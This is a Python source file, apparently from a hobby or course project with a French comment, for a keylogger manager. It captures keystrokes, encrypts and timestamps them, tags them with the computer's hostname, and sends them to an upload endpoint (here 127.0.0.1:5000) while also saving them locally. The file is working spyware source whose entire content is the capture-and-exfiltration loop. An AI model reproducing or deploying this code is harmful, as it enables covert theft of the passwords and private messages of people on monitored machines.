import os
import socket
import datetime
import time
import threading
from KeyService import KeyLoggerService
from FileWriter import FileWriter
from Encryptor import Encryptor
from NetworkWriter import NetworkWriter


class KeyLoggerManager:
    def __init__(self, secret_key):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.encryptor = Encryptor(secret_key)
        self.network_writer = NetworkWriter()
        self.data_dic = {}
        self.num_of_enter = 0
        self.computer_id = socket.gethostname()
        self.datestamp = ""

    def run(self):
        self.service.start_logging()
        while self.service.running:
            time.sleep(2)
            self.add_to_dic()
            self.num_of_enter += 1
            if self.num_of_enter == 3:
                threading.Thread(target=self.save_locally, daemon=True).start()
                self.num_of_enter = 0

    def stop(self):
        self.service.stop_logging()
        print("KeyLogger stopped.")

    def add_to_dic(self):

        logged_keys = "".join(self.service.get_logged_keys())
        if logged_keys == "":
            return
        encrypted_data = self.encryptor.encrypt(logged_keys)
        hourstamp = datetime.datetime.now().strftime("%H:%M:%S")
        self.datestamp = datetime.datetime.now().strftime("%Y-%m-%d")

        if encrypted_data:
            self.data_dic[hourstamp] = {"key_data": encrypted_data}

        self.service.clear_data()
        print(f"Added {len(logged_keys)} keys to the dictionary.")

    def save_locally(self):
        try:
            print(f"Data to send: {self.data_dic}")
            self.send_to_server()

            self.file_writer.send_data(self.data_dic, self.computer_id)
            print("Data saved locally.")
            self.data_dic = {}
        except Exception as e:
            print(f"Failed to save data locally: {e}")

    def send_to_server(self):
        """Send encrypted logs to the server with computer ID."""
        payload = {
            "computer_id": self.computer_id,
            "logs": self.data_dic
        }
        self.network_writer.send_data(payload, "http://127.0.0.1:5000/upload")


if __name__ == "__main__":
    secret_key = "your_secure_secret_key"
    keyManager = KeyLoggerManager(secret_key)

    keylogger_thread = threading.Thread(target=keyManager.run, daemon=True)
    keylogger_thread.start()

    try:
        while True:
            time.sleep(1)  # Permet de garder le programme actif
    except KeyboardInterrupt:
        keyManager.stop()
        keylogger_thread.join()  # Attendre la fin du thread
